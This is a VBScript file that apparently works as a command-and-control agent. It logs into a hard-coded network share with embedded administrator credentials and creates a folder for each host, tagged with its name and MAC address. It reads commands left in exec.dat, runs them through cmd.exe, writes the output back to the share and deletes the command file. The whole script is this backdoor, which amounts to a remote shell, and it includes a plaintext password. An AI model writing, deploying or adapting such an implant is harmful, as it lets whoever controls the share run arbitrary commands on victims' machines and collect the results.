ServerShare = "\\192.168.99.100\D$"
UserName = "MSEDGEWIN10\Administrator1234"
Password = "Admin123"
ProjectName = "projectName"
Set NetworkObject = CreateObject("WScript.Network")
Set FSO = CreateObject("Scripting.FileSystemObject")

'NetworkObject.MapNetworkDrive "", ServerShare, False, UserName, Password'


projectDir = ServerShare & "\" & ProjectName

If NOT (FSO.FolderExists(projectDir)) Then
	FSO.CreateFolder(projectDir)
End If

Set WMI = GetObject("winmgmts:\\.\root\cimv2")
Set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 

Dim Nad
For Each Nad in Nads 
   macAddress = Nad.MACAddress
   exit for
Next

hostName = NetworkObject.ComputerName
hostDir = projectDir & "\" & hostName & "-" & macAddress

If NOT (FSO.FolderExists(hostDir)) Then
	FSO.CreateFolder(hostDir)
End If
Set objShell = CreateObject("WScript.Shell") 

Set colVolEnvVars = objShell.Environment("Volatile")
colVolEnvVars("PATH") = hostDir

execFile = hostDir & "\exec.dat"
Set colVolEnvVars = Nothing

If FSO.FileExists(execFile) Then

	Set execObjFile = FSO.OpenTextFile(execFile,1)
	user_comm = execObjFile.ReadAll()

	command = "%comspec% /c " & user_comm
	'command = "powershell.exe " & user_comm'
	Set oExec = objShell.Exec(command)


	outFile = hostDir & "\output.dat"
	If NOT (FSO.FileExists(outFile)) Then
		Set objFile = FSO.CreateTextFile(outFile, 1)
	Else
		Set objFile = FSO.OpenTextFile(outFile, 8, 1)
	End If

	objFile.write(oExec.StdOut.ReadAll() & oExec.StdErr.ReadAll())

	objFile.Close
	execObjFile.Close
	FSO.DeleteFile execFile 
	Set execObjFile = Nothing
	Set objShell = Nothing
	set oExec = Nothing
	Set objFile = Nothing

End If

Set Directory = Nothing
Set FSO = Nothing

'NetworkObject.RemoveNetworkDrive ServerShare, True, False'

Set ShellObject = Nothing
Set NetworkObject = Nothing
Set WMI = Nothing
Set Nads = Nothing
